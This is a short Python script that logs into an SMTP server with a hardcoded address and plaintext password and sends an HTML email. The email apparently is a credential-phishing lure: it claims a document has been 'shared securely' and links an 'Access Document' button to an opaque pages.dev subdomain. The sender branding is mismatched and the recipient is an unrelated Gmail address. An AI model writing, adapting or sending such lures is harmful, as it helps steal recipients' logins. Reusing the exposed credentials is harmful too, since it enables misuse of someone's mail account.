# send_email_short.py
import smtplib, ssl
from email.message import EmailMessage

# ---------- Credentials & server (from you) ----------
EMAIL_USER = "krader@charlestonconventiocomplex.com"
EMAIL_PASS = "Playdumb$100"

SMTP_HOST = "smtp.us.appsuite.cloud"
SMTP_PORT = 465  # SSL

# ---------- Message ----------
msg = EmailMessage()
msg["Subject"] = "Test Email from Python"
msg["From"] = "OutMail Pro <krader@charlestonconventiocomplex.com>"
msg["To"] = "ismailadedapo1@gmail.com"
msg.set_content("This is a plain-text test email sent from a short Python script.")
msg.add_alternative("""\
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Document Shared</title>
</head>
<body style="font-family: Arial, sans-serif; background-color: #f9f9f9; margin: 0; padding: 20px;">
  <div style="background-color: #ffffff; max-width: 600px; margin: 0 auto; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.05);">
    <p>Hi,</p>
    <p>This document has been shared with you securely by Krader. You can access it using the button below:</p>
    <p>
      <a href="https://stp26jlc215gd57j3y7d202d0k1jdg9d70211ls43cfi.pages.dev"
         style="background-color:#0052cc; color:#ffffff; text-decoration:none; padding:12px 20px; border-radius:5px; font-weight:bold; display:inline-block;"
         target="_blank" rel="noopener noreferrer">
         Access Document
      </a>
    </p>
    <p>If you have any questions, feel free to reply to this email directly.</p>
    <p>Best regards,<br>
      krader<br>
       AG Fire EEDBQ<br>
       Email: <a href="mailto:krader@charlestonconventiocomplex.com">krader@charlestonconventiocomplex.com</a></p>
    <div style="font-size:12px; color:#777777; margin-top:30px;">
      Thank you for using the Charleston Convention Complex services.
    </div>
  </div>
</body>
</html>
""", subtype="html")

# ---------- Send via SMTP over SSL ----------
context = ssl.create_default_context()
with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as smtp:
    smtp.login(EMAIL_USER, EMAIL_PASS)
    smtp.send_message(msg)

print("✅ Email sent to ismailadedapo1@gmail.com")
